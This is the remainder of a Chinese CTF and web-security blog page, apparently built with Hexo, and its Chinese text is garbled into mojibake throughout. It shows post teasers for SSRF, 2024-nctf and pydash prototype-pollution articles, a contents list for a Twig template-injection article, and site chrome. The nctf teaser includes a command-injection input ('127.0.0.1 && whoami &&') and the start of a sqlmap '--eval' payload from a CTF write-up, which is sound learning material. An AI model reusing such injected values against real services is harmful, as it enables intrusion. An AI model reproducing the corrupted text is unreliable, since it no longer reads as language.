åœºæ¯”èµ›ä¸­ï¼Œè€ƒå¯Ÿäº†SSRFçš„çŸ¥è¯†ç‚¹ï¼Œå®è·µä¸‹æ¥ï¼Œå‘ç°æˆ‘ä¹‹å‰ä¸¥é‡ä½ä¼°äº†SSRFçš„å¨åŠ›ï¼Œæ‰€ä»¥å†³å®šå†™ä¸‹è¿™ç¯‡æ–‡ç« ï¼Œç®€å•æ¢³ç†ä¸€ä¸‹SSRFçš„æ¼æ´åŸç†åŠåˆ©ç”¨æ–¹æ³•ã€‚ ä»€ä¹ˆæ˜¯SSRFï¼Ÿâ€‹	SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )...</div></div></div></a><a class="pagination-related" href="/2025/03/23/2024-nctf/" title="2024-nctf ä¸ªäººWP"><img class="cover" src="/img/2024-nctf/cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">2024-nctf ä¸ªäººWP</div></div><div class="info-2"><div class="info-item-1">sqlmap-master â€‹	è®¿é—®ç¯å¢ƒåå‘ç°è¿™æ˜¯ä¸€ä¸ªsqlmapçš„webæœåŠ¡ï¼Œä¼ å…¥127.0.0.1åå¯è§æ‰§è¡Œäº†sqlmapå‘½ä»¤ï¼Œå°è¯•è¾“å…¥ 1127.0.0.1 &amp;&amp; whoami &amp;&amp;  â€‹	å‘ç°æœªèƒ½æ³¨å…¥å‘½ä»¤ï¼Œåˆ†ææºç ã€‚ 1234567def generate():    process = subprocess.Popen(        command.split(),        stdout=subprocess.PIPE,        stderr=subprocess.STDOUT,        shell=False    )  â€‹	å‘ç°æ‰§è¡Œå‘½ä»¤çš„è¿™ä¸ªæ–¹æ³•ï¼ŒæŠŠä¼ å…¥çš„å‘½ä»¤åˆ†å‰²äº†ï¼Œä¸”shell=Falseï¼Œæ‰€ä»¥è¿™é‡Œçš„&amp;ä¸ä¼šè¢«å½“ä½œbashçš„ç‰¹æ®Šå­—ç¬¦ï¼Œè€Œä¼šè¢«å½“ä½œä¼ å‚ä¼ å…¥ï¼Œæ‰€ä»¥æ³¨å…¥å¤±è´¥äº†ã€‚è¿™é‡Œæˆ‘ä»¬å°±å¾—è½¬å˜æ–¹å‘äº†ï¼Œå°è¯•å¯»æ‰¾æœ‰æ²¡æœ‰å¯èƒ½åˆ©ç”¨sqlmapæœ¬èº«çš„å‚æ•°ã€‚  â€‹	æˆ‘ä»¬å‘ç°è¿™é‡Œæœ‰ä¸€ä¸ªevalå‚æ•°å¯ä»¥æ‰§è¡Œä»»æ„çš„pythonä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹å‚æ•°ï¼š 12127.0.0.1 --eval...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/08/Pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/" title="Pydash setåŸå‹é“¾æ±¡æŸ“æ¼æ´è§£æ"><img class="cover" src="/img/pydash-set-chain-contamination/cover.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-08</div><div class="info-item-2">Pydash setåŸå‹é“¾æ±¡æŸ“æ¼æ´è§£æ</div></div><div class="info-2"><div class="info-item-1">å‰è¨€åœ¨nctfä¸­é‡åˆ°äº†ä¸€pydashçš„é¢˜ç›®ï¼Œæ˜¯æ²¡è§è¿‡çš„çŸ¥è¯†ï¼Œæ‰€ä»¥å†™ä¸€ç¯‡æ–‡ç« å¤ç°åˆ†æä¸€ä¸‹ã€‚ 2024-nctfæºç 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&#x27;&#x27;&#x27;Hints: Flagåœ¨ç¯å¢ƒå˜é‡ä¸­&#x27;&#x27;&#x27;from typing import Optionalimport pydashimport bottle__forbidden_path__=[&#x27;__annotations__&#x27;, &#x27;__call__&#x27;, &#x27;__class__&#x27;, &#x27;__closure__&#x27;,               &#x27;__code__&#x27;, &#x27;__defaults__&#x27;, &#x27;__delattr__&#x27;,...</div></div></div></a><a class="pagination-related" href="/2024/12/18/pythonssti/" title="pythonæ¨¡æ¿æ³¨å…¥æ¼æ´æ·±åº¦è§£æï¼Œä»æˆå› åˆ°ç®€å•åˆ©ç”¨ï¼Œä»ç®€å•åˆ©ç”¨åˆ°ç»•è¿‡ï¼Œä»å›æ˜¾åˆ°ç›²æ³¨"><img class="cover" src="/img/python-ssti/cover.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-18</div><div class="info-item-2">pythonæ¨¡æ¿æ³¨å…¥æ¼æ´æ·±åº¦è§£æï¼Œä»æˆå› åˆ°ç®€å•åˆ©ç”¨ï¼Œä»ç®€å•åˆ©ç”¨åˆ°ç»•è¿‡ï¼Œä»å›æ˜¾åˆ°ç›²æ³¨</div></div><div class="info-2"><div class="info-item-1">æ¨¡æ¿æ³¨å…¥æ¼æ´æˆå› â€‹	æ¨¡æ¿æ³¨å…¥æ¼æ´çš„é€ æˆæ˜¯ç”±äºåœ¨ç¨‹åºè®¾è®¡æ—¶ï¼Œæ²¡æœ‰å°†ç”¨æˆ·ä¼ å…¥çš„å‚æ•°è¿›è¡Œé€‚å½“çš„å¤„ç†å†æ’å…¥æ¨¡æ¿ä¸­ï¼Œè€Œæ˜¯ç›´æ¥å°†ç”¨æˆ·çš„å‚æ•°åµŒå…¥åˆ°æ¨¡æ¿ä¸­ï¼Œä»è€Œå¯¼è‡´æ¼æ´ã€‚ â€‹	ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„æ¨¡æ¿æ³¨å…¥æ¼æ´çš„ç¤ºä¾‹ï¼š 123@app.route(&#x27;/ssti-nowaf&#x27;)def ssti_nowaf():    return...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/headimg.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">hada</div><div class="author-info-description">hadaçš„ä¸ªäººåšå®¢ç½‘ç«™</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hadagaga"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/hadagaga" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">1.</span> <span class="toc-text">PHPå¸¸è§æ¨¡æ¿å¼•æ“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8Epayload%E6%A0%BC%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">æ¨¡æ¿å¼•æ“payloadæ ¼å¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Twig"><span class="toc-number">3.</span> <span class="toc-text">Twig</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">ç®€ä»‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">åŸºç¡€è¯­æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">3.2.1.</span> <span class="toc-text">å˜é‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">3.2.2.</span> <span class="toc-text">å…¨å±€å˜é‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A3%B0%E6%98%8E%E5%8F%98%E9%87%8F"><span class="toc-number">3.2.3.</span> <span class="toc-text">å£°æ˜å˜é‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.2.4.</span> <span class="toc-text">è¿‡æ»¤å™¨</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%9C%E7%94%A8"><span class="toc-number">3.2.4.1.</span> <span class="toc-text">ä½œç”¨</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95"><span class="toc-number">3.2.4.2.</span> <span class="toc-text">è¯­æ³•</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.2.4.3.</span> <span class="toc-text">ç¤ºä¾‹</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96-date"><span class="toc-number">3.2.4.3.1.</span> <span class="toc-text">æ—¥æœŸæ ¼å¼åŒ– (date)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2"><span class="toc-number">3.2.4.3.2.</span> <span class="toc-text">å¤§å°å†™è½¬æ¢</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%80%BC-default"><span class="toc-number">3.2.4.3.3.</span> <span class="toc-text">é»˜è®¤å€¼ (default)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%88%87%E7%89%87-slice"><span class="toc-number">3.2.4.3.4.</span> <span class="toc-text">æ•°ç»„åˆ‡ç‰‡ (slice)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84"><span class="toc-number">3.2.5.</span> <span class="toc-text">æ§åˆ¶ç»“æ„</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%EF%BC%88if%E8%AF%AD%E5%8F%A5%EF%BC%89%EF%BC%9A"><span class="toc-number">3.2.5.1.</span> <span class="toc-text">æ¡ä»¶è¯­å¥ï¼ˆifè¯­å¥ï¼‰ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95"><span class="toc-number">3.2.5.1.1.</span> <span class="toc-text">åŸºç¡€ç”¨æ³•</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A4%8D%E5%90%88%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.2.5.1.2.</span> <span class="toc-text">å¤åˆæ¡ä»¶</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A9%BA%E5%80%BC%E6%A0%A1%E9%AA%8C"><span class="toc-number">3.2.5.1.3.</span> <span class="toc-text">ç©ºå€¼æ ¡éªŒ</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BE%AA%E7%8E%AF%E6%8E%A7%E5%88%B6-for-%E5%BE%AA%E7%8E%AF"><span class="toc-number">3.2.5.2.</span> <span class="toc-text">å¾ªç¯æ§åˆ¶ (for å¾ªç¯)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E6%95%B0%E7%BB%84"><span class="toc-number">3.2.5.2.1.</span> <span class="toc-text">éå†æ•°ç»„</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84"><span class="toc-number">3.2.5.2.2.</span> <span class="toc-text">éå†å…³è”æ•°ç»„</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%90%E5%AE%9A%E5%BE%AA%E7%8E%AF%E8%8C%83%E5%9B%B4"><span class="toc-number">3.2.5.2.3.</span> <span class="toc-text">é™å®šå¾ªç¯èŒƒå›´</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BE%AA%E7%8E%AF-%E6%9D%A1%E4%BB%B6%E7%BB%84%E5%90%88"><span class="toc-number">3.2.5.3.</span> <span class="toc-text">å¾ªç¯ + æ¡ä»¶ç»„åˆ</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.2.5.4.</span> <span class="toc-text">å®Œæ•´ç¤ºä¾‹</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%BE%AA%E7%8E%AF%E6%8E%A7%E5%88%B6"><span class="toc-number">3.2.5.5.</span> <span class="toc-text">ç‰¹æ®Šå¾ªç¯æ§åˆ¶</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.6.</span> <span class="toc-text">å‡½æ•°</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">3.2.6.1.</span> <span class="toc-text">ç¤ºä¾‹</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E5%85%B6%E4%BB%96%E6%A8%A1%E6%9D%BF"><span class="toc-number">3.2.7.</span> <span class="toc-text">å¼•å…¥å…¶ä»–æ¨¡æ¿</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF"><span class="toc-number">3.2.8.</span> <span class="toc-text">ç»§æ‰¿</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%B6%E6%A8%A1%E6%9D%BFbase-html-twig"><span class="toc-number">3.2.8.1.</span> <span class="toc-text">çˆ¶æ¨¡æ¿base.html.twig</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%90%E6%A8%A1%E6%9D%BFpage-html-twig"><span class="toc-number">3.2.8.2.</span> <span class="toc-text">å­æ¨¡æ¿page.html.twig</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E8%84%9A%E6%9C%ACpage-php"><span class="toc-number">3.2.8.3.</span> <span class="toc-text">PHPè„šæœ¬page.php</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Twig-1-x"><span class="toc-number">3.3.</span> <span class="toc-text">Twig 1.x</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">3.3.1.</span> <span class="toc-text">å®‰è£…</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.3.2.</span> <span class="toc-text">ä»£ç ç¤ºä¾‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E8%A7%A3%E6%9E%90"><span class="toc-number">3.3.3.</span> <span class="toc-text">åˆ©ç”¨é“¾è§£æ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Twig-2-x-3-x"><span class="toc-number">3.4.</span> <span class="toc-text">Twig 2.x &#x2F; 3.x</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">å®‰è£…</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">3.4.2.</span> <span class="toc-text">ä»£ç ç¤ºä¾‹</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#map%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.4.2.1.</span> <span class="toc-text">mapè¿‡æ»¤å™¨</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#map-html-twig"><span class="toc-number">3.4.2.1.1.</span> <span class="toc-text">map.html.twig</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#map-php"><span class="toc-number">3.4.2.1.2.</span> <span class="toc-text">map.php</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">3.4.2.1.3.</span> <span class="toc-text">ç›®å½•ç»“æ„</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90"><span class="toc-number">3.4.2.1.4.</span> <span class="toc-text">åˆ©ç”¨è§£æ</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#filer%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.4.2.2.</span> <span class="toc-text">filerè¿‡æ»¤å™¨</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#filter-html-twig"><span class="toc-number">3.4.2.2.1.</span> <span class="toc-text">filter .html.twig</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#filter-php"><span class="toc-number">3.4.2.2.2.</span> <span class="toc-text">filter.php</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84-1"><span class="toc-number">3.4.2.2.3.</span> <span class="toc-text">ç›®å½•ç»“æ„</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90-1"><span class="toc-number">3.4.2.2.4.</span> <span class="toc-text">åˆ©ç”¨è§£æ</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#reduce-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.4.2.3.</span> <span class="toc-text">reduce è¿‡æ»¤å™¨</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#reduce-html-twig"><span class="toc-number">3.4.2.3.1.</span> <span class="toc-text">reduce.html.twig</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#reduce-php"><span class="toc-number">3.4.2.3.2.</span> <span class="toc-text">reduce.php</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84-2"><span class="toc-number">3.4.2.3.3.</span> <span class="toc-text">ç›®å½•ç»“æ„</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90-2"><span class="toc-number">3.4.2.3.4.</span> <span class="toc-text">åˆ©ç”¨è§£æ</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sort-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.4.2.4.</span> <span class="toc-text">sort è¿‡æ»¤å™¨</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#sort-html-twig"><span class="toc-number">3.4.2.4.1.</span> <span class="toc-text">sort.html.twig</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sort-php"><span class="toc-number">3.4.2.4.2.</span> <span class="toc-text">sort.php</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84-3"><span class="toc-number">3.4.2.4.3.</span> <span class="toc-text">ç›®å½•ç»“æ„</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%A7%A3%E6%9E%90-3"><span class="toc-number">3.4.2.4.4.</span> <span class="toc-text">åˆ©ç”¨è§£æ</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">4.</span> <span class="toc-text">å‚è€ƒæ–‡ç« </span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/05/15/JavaCC%E9%93%BE1/" title="Javaååºåˆ—åŒ–CCé“¾1"><img src="/img/JavaCC1/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Javaååºåˆ—åŒ–CCé“¾1"/></a><div class="content"><a class="title" href="/2025/05/15/JavaCC%E9%93%BE1/" title="Javaååºåˆ—åŒ–CCé“¾1">Javaååºåˆ—åŒ–CCé“¾1</a><time datetime="2025-05-14T16:00:00.000Z" title="å‘è¡¨äº 2025-05-15 00:00:00">2025-05-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/08/Pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/" title="Pydash setåŸå‹é“¾æ±¡æŸ“æ¼æ´è§£æ"><img src="/img/pydash-set-chain-contamination/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pydash setåŸå‹é“¾æ±¡æŸ“æ¼æ´è§£æ"/></a><div class="content"><a class="title" href="/2025/04/08/Pydash-set%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/" title="Pydash setåŸå‹é“¾æ±¡æŸ“æ¼æ´è§£æ">Pydash setåŸå‹é“¾æ±¡æŸ“æ¼æ´è§£æ</a><time datetime="2025-04-07T16:00:00.000Z" title="å‘è¡¨äº 2025-04-08 00:00:00">2025-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/01/JavaSerialization01/" title="Javaååºåˆ—åŒ–-01"><img src="/img/JavaSerialization01/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Javaååºåˆ—åŒ–-01"/></a><div class="content"><a class="title" href="/2025/04/01/JavaSerialization01/" title="Javaååºåˆ—åŒ–-01">Javaååºåˆ—åŒ–-01</a><time datetime="2025-03-31T16:00:00.000Z" title="å‘è¡¨äº 2025-04-01 00:00:00">2025-04-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/23/2024-nctf/" title="2024-nctf ä¸ªäººWP"><img src="/img/2024-nctf/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024-nctf ä¸ªäººWP"/></a><div class="content"><a class="title" href="/2025/03/23/2024-nctf/" title="2024-nctf ä¸ªäººWP">2024-nctf ä¸ªäººWP</a><time datetime="2025-03-22T16:00:00.000Z" title="å‘è¡¨äº 2025-03-23 00:00:00">2025-03-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/03/PHPsstiTwig/" title="PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡"><img src="/img/PHP-ssti-Twig/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡"/></a><div class="content"><a class="title" href="/2025/03/03/PHPsstiTwig/" title="PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡">PHPæ¨¡æ¿æ³¨å…¥æ¼æ´-Twigç¯‡</a><time datetime="2025-03-02T16:00:00.000Z" title="å‘è¡¨äº 2025-03-03 00:00:00">2025-03-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/PHP-ssti-Twig/cover.png);"><div id="footer-wrap"><div class="copyright">&copy;2025 By hada</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="ç®€ç¹è½¬æ¢">ç°¡</button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>